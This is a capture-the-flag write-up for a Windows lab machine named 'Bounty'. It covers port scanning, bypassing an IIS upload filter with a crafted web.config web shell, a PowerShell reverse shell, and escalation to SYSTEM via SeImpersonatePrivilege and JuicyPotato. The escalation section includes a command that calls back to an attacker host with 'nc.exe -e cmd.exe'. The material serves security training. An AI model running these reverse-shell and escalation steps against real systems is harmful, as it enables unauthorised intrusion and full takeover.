# Bounty — Easy — Windows

**Date:** 24 June 2026

---

## Tags
`#windows` `#iis` `#file-upload` `#web-config` `#aspx` `#seimpersonate` `#juicypotato` `#privesc`

---

## What I Know

| Item       | Detail                                                       |
| ---------- | ----------------------------------------------------------- |
| Target     | 10.129.20.179                                                |
| OS         | Windows                                                      |
| Open ports | 80 (HTTP)                                                    |
| Service    | Microsoft IIS 7.5                                            |
| Foothold   | transfer.aspx upload → web.config code execution → reverse shell |
| User       | merlin                                                       |
| Privesc    | SeImpersonatePrivilege → JuicyPotato → nt authority\system   |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.20.179

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-24 13:59 +0100
Nmap scan report for 10.129.20.179
Host is up (0.021s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 44.51 seconds
```

<img width="843" height="282" alt="image" src="https://github.com/user-attachments/assets/2543ddbb-0cad-456a-b79e-4b66ce050d49" />

```
nmap -sC -sV -p80 10.129.20.179

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-24 13:59 +0100
Nmap scan report for 10.129.20.179
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds
```

<img width="1202" height="433" alt="image" src="https://github.com/user-attachments/assets/87092799-e7c7-45c6-9a38-672bacc6e2bf" />

**What each port tells me:**
- **Port 80 (HTTP)** — Microsoft IIS 7.5 is the only open port, so the entire attack surface is this one web application. IIS 7.5 is also an old version, which is worth keeping in mind for upload-handling quirks.

---

## Enumeration Log

```
OBSERVATION: Port 80 is open and serving a web application (only open port)
WHAT IT TELLS ME: The web app is the sole entry point to the server
WHAT I AM GOING TO TRY: Browse the site to see what it does
WHY: Port 80 is the only way in
RESULT: A single-page app showing an image, nothing immediately interesting
WHAT NEXT:
- Directory-fuzz for hidden paths
- Read the page source
- Identify the tech stack
- Analyse the image for anything hidden (steg)
```

<img width="2076" height="736" alt="image" src="https://github.com/user-attachments/assets/8e05afcd-37a1-4756-88e8-41809d212614" />

```
OBSERVATION:
- Directory fuzzing revealed two interesting paths: /UploadedFiles and /transfer.aspx
- Nothing notable in the source, tech stack, or the image
WHAT IT TELLS ME: Investigate the discovered paths to understand their purpose
WHAT I AM GOING TO TRY: Navigate to both paths
WHY: To learn their content/functionality
RESULT:
- /transfer.aspx is an upload form with some file-type restrictions
- /UploadedFiles is where uploads land (accessible at the same name you uploaded)
- Uploaded files get deleted after a few seconds
WHAT NEXT: Try to upload a reverse-shell payload and trigger it quickly before deletion
```

<img width="1728" height="777" alt="image" src="https://github.com/user-attachments/assets/72cd829a-8387-4b23-9864-d0eaef14b09d" />

<img width="738" height="290" alt="image" src="https://github.com/user-attachments/assets/bd82a3a2-9033-4965-9b25-dad8f8b75bf3" />

```
OBSERVATION:
- The upload form mainly allows image types
- Any reverse shell I upload must be triggered fast, since uploads are auto-deleted
WHAT IT TELLS ME: I need to bypass the file-type restriction to upload something executable
WHAT I AM GOING TO TRY: Research upload-filter bypasses specific to this stack (ASP.NET / IIS)
WHY: There's a file-upload feature and the uploaded file is directly reachable by name. A clean RCE opportunity if I can get an executable type through
RESULT:
- PayloadsAllTheThings (Upload Insecure Files) lists IIS-relevant bypass extensions:
  .asp, .aspx, .config, .cer / .asa (IIS <= 7.5), shell.aspx;1.jpg (IIS < 7.0)
- Testing systematically, the app accepts .config
- The same resource describes web.config abuse: a crafted web.config can host an ASP web shell
  (payload: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
WHAT NEXT:
- Make a local copy of the web.config payload, upload it, and trigger it for a web shell
- From the web shell, use a Windows reverse-shell one-liner (from https://www.revshells.com/) for a full shell
```

<img width="573" height="184" alt="image" src="https://github.com/user-attachments/assets/2ff2a12c-f7df-4046-ae6c-771f078d5bbb" />

<img width="578" height="326" alt="image" src="https://github.com/user-attachments/assets/7de48450-1a2f-47ab-aa84-429da372a51d" />

<img width="852" height="291" alt="image" src="https://github.com/user-attachments/assets/142eb98b-a90e-4bf9-a6aa-49366e4a78ad" />

```
OBSERVATION: Uploaded the web.config payload, triggered it, and used a reverse-shell one-liner to get a foothold
WHAT IT TELLS ME: I have code execution as the web user; now find a privesc path
WHAT I AM GOING TO TRY: Enumerate the system for privilege escalation vector
WHY: To escalate toward SYSTEM and read root.txt on the Administrator's Desktop
RESULT:
- user.txt was hidden in C:\Users\merlin\Desktop, I used `ls --force` (PowerShell) to reveal
  hidden items before reading it
WHAT NEXT: Enumerate for a privesc vector
```

<img width="977" height="525" alt="image" src="https://github.com/user-attachments/assets/4657ba61-5721-44ff-9e96-1cd17e6779ea" />

<img width="1921" height="965" alt="image" src="https://github.com/user-attachments/assets/23924ddc-3514-4817-a9d0-0f90416364e9" />

<img width="829" height="453" alt="image" src="https://github.com/user-attachments/assets/c0873b08-bb37-4218-bc3b-89f0c28d2f7c" />

<img width="827" height="576" alt="image" src="https://github.com/user-attachments/assets/dbccbe35-2191-4995-9479-02127ba53a59" />

```
OBSERVATION: whoami /priv shows the account has SeImpersonatePrivilege enabled
WHAT IT TELLS ME: SeImpersonate is a classic Windows privesc, it allows abusing token impersonation to run as SYSTEM
WHAT I AM GOING TO TRY: Escalate with JuicyPotato, abusing SeImpersonate
WHY: On this Windows version, SeImpersonate can be abused with JuicyPotato.exe + nc.exe to execute commands as nt authority\system
RESULT: Got nt authority\system and read root.txt from C:\Users\Administrator\Desktop
```

<img width="584" height="115" alt="image" src="https://github.com/user-attachments/assets/8479bc91-45cb-45ee-975f-57306a78ebc8" />

<img width="584" height="115" alt="image" src="https://github.com/user-attachments/assets/e5a22121-9c33-42c6-97ab-145e6fd48299" />

<img width="2051" height="281" alt="image" src="https://github.com/user-attachments/assets/98eaa41f-88cb-46b0-80ff-25eeaa2e282e" />

<img width="1806" height="311" alt="image" src="https://github.com/user-attachments/assets/765d6781-fb78-4fca-bb46-97b2a76423e8" />

<img width="2066" height="403" alt="image" src="https://github.com/user-attachments/assets/7de062a5-4e40-4862-89b5-596f9a315393" />

<img width="1062" height="713" alt="image" src="https://github.com/user-attachments/assets/ff8b99a6-091a-4a67-bbf2-ce2c116a2ca8" />

---

## Foothold

**How I got in:** The only service was IIS 7.5 serving an upload form at `/transfer.aspx`, with uploads landing in `/UploadedFiles` and reachable by name. The form's file-type filter blocked typical executable extensions but allowed **`.config`**. On IIS/ASP.NET, a `web.config` file can itself contain executable ASP code, so uploading a crafted `web.config` gave server-side code execution. I used the PayloadsAllTheThings web.config web-shell payload, triggered it by browsing to `/UploadedFiles/web.config`, and fired a PowerShell reverse-shell one-liner to land a shell as **merlin**.

**Command / exploit used:**
```
# craft web.config from PayloadsAllTheThings, embedding a PowerShell reverse shell
# upload via /transfer.aspx, then trigger:
curl http://10.129.20.179/UploadedFiles/web.config
# listener
nc -lnvp <LPORT>          # → shell as merlin
# user.txt was hidden:
ls --force                # (PowerShell) reveal hidden items, then read user.txt
```

**Why it worked:** The upload filter only checked the extension and overlooked `.config`. Because `web.config` is itself executed by IIS/ASP.NET and can embed ASP/script, an allowed "config" upload is really arbitrary code execution. Serving uploads from a path reachable by name meant I could trigger the payload on demand.

---

## Privilege Escalation

**Path taken (merlin → SYSTEM):** Post-foothold enumeration (`whoami /priv`) showed **SeImpersonatePrivilege** was enabled on the merlin account, a hallmark of IIS/service accounts. SeImpersonate lets a process impersonate security tokens, which the "Potato" family of exploits abuses by coercing a SYSTEM service to authenticate to a local listener and then stealing/impersonating its token. Given the Windows version, I used **JuicyPotato** with `nc.exe` to execute a command as `nt authority\system`, returning a SYSTEM shell then read `root.txt` from the Administrator's Desktop.

```
# upload JuicyPotato.exe and nc.exe to the target (e.g. certutil/powershell download)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe \
  -a "/c C:\path\nc.exe <LHOST> <LPORT> -e cmd.exe" -t * -c {CLSID}
# listener on attacker → nt authority\system
```

**Why it worked:** The web application ran under an account holding SeImpersonatePrivilege, and the machine was unpatched against the token-impersonation abuse JuicyPotato uses. Any code execution in a SeImpersonate context on such a host can be escalated to SYSTEM so the foothold account's privilege, not a second credential, was the whole privesc. (This is exactly the "keep systems patched" lesson the box is built around.)

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Bypassed the IIS upload filter with a `.config` file, abused web.config's executable nature to run an ASP web shell, and pivoted to a PowerShell reverse shell as merlin.
2. **Privesc technique in one sentence:** Abused the account's SeImpersonatePrivilege with JuicyPotato to impersonate a SYSTEM token and get an `nt authority\system` shell.
